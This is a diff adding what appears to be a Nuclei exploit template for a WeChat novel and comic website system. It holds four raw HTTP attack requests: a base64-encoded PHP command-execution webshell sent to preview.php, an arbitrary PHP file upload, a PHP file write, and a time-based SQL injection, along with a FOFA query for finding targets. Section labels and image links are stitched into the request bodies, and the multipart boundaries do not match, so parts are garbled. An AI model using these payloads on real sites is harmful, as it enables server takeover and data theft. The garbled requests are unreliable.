@@ -1,0 +1,227 @@
+id: poc-fi7snq0gxzf88boy
+info:
+  name: 微信公众号小说漫画系统多个漏洞合集
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fi7snq0gxzf88boy
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fi7snq0gxzf88boy
+    fofa: '"Public/home/mhjs/jquery.js"'
+http:
+- raw:
+  - 'POST /Public/webuploader/0.1.5/server/preview.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cache-Control: max-age=0
+
+    sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="101"
+
+    sec-ch-ua-mobile: ?0
+
+    sec-ch-ua-platform: "Windows"
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Sec-Fetch-Site: none
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-User: ?1
+
+    Sec-Fetch-Dest: document
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    Content-Length: 298
+
+    data:image/php;base64,PD9waHANCiAgICBpZihpc3NldCgkX1JFUVVFU1RbJ2NtZCddKSl7DQogICAgICAgICAgICBlY2hvICI8cHJlPiI7DQogICAgICAgICAgICAkY21kID0gKCRfUkVRVUVTVFsnY21kJ10pOw0KICAgICAgICAgICAgc3lzdGVtKCRjbWQpOw0KICAgICAgICAgICAgZWNobyAiPC9wcmU+IjsNCiAgICAgICAgICAgIGRpZTsNCiAgICB9DQogICAgcGhwaW5mbygpOw0KPz4=
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739792819109-26cb90a7-e9eb-4115-9674-40c9292f24f3.png)
+
+    **前台任意文件上传漏洞**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /Public/webuploader/0.1.5/server/fileupload.php HTTP/1.1
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+
+    Cache-Control: no-cache
+
+    Connection: keep-alive
+
+    Content-Length: 197
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAW4kl2MUmkWNAgBW
+
+    Cookie: PHPSESSID=bf13e78oe1uqp8nh3crld1gu55; curIndex=3; uloginid=586639
+
+    Host: {{Hostname}}
+
+    Origin: [http://127.0.0.1](http://127.0.0.1)
+
+    Pragma: no-cache
+
+    Referer: [http://127.0.0.1/Public/webuploader/0.1.5/server/fileupload.php](http://127.0.0.1/Public/webuploader/0.1.5/server/fileupload.php)
+
+    Sec-Fetch-Dest: document
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-Site: none
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+
+    sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
+
+    sec-ch-ua-mobile: ?0
+
+    sec-ch-ua-platform: "Windows"
+
+    sec-fetch-user: ?1
+
+    ------WebKitFormBoundary03rNBzFMIytvpWhy
+
+    Content-Disposition: form-data; name="file"; filename="1.php"
+
+    Content-Type: image/jpeg
+
+    <?php phpinfo();?>
+
+    ------WebKitFormBoundary03rNBzFMIytvpWhy--
+
+    文件上传在 /Public/webuploader/0.1.5/server/upload/1.php
+
+    **任意文件写入漏洞(RCE)**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /index.php?m=&c=IndexAjax&a=Upload HTTP/1.1
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+
+    Cache-Control: no-cache
+
+    Connection: keep-alive
+
+    Content-Length: 78
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cookie: PHPSESSID=bf13e78oe1uqp8nh3crld1gu55; uloginid=107639
+
+    Host: {{Hostname}}
+
+    Origin: [http://127.0.0.1](http://127.0.0.1)
+
+    Pragma: no-cache
+
+    Referer: [http://127.0.0.1/index.php?m=&c=IndexAjax](http://127.0.0.1/index.php?m=&c=IndexAjax)
+
+    Sec-Fetch-Dest: document
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-Site: same-origin
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+
+    sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
+
+    sec-ch-ua-mobile: ?0
+
+    sec-ch-ua-platform: "Windows"
+
+    img=data:image/php;base64,YTw/cGhwIHBocGluZm8oKTs/Pg==&size=50
+
+    **前台SQL注入漏洞**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /jiekou.php HTTP/1.1
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+
+    Cache-Control: no-cache
+
+    Connection: keep-alive
+
+    Content-Length: 20
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Host: {{Hostname}}
+
+    Origin: [http://127.0.0.1](http://127.0.0.1)
+
+    Pragma: no-cache
+
+    Referer: [http://127.0.0.1/jiekou.php](http://127.0.0.1/jiekou.php)
+
+    Sec-Fetch-Dest: document
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-Site: none
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+
+    sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
+
+    sec-ch-ua-mobile: ?0
+
+    sec-ch-ua-platform: "Windows"
+
+    sec-fetch-user: ?1
+
+    sl=1&bookname='' AND (SELECT 2775 FROM (SELECT(SLEEP(5)))IiIJ)-- XrlG
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739792819355-fca4370b-a93e-45fc-a952-7732bbac1302.png)'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
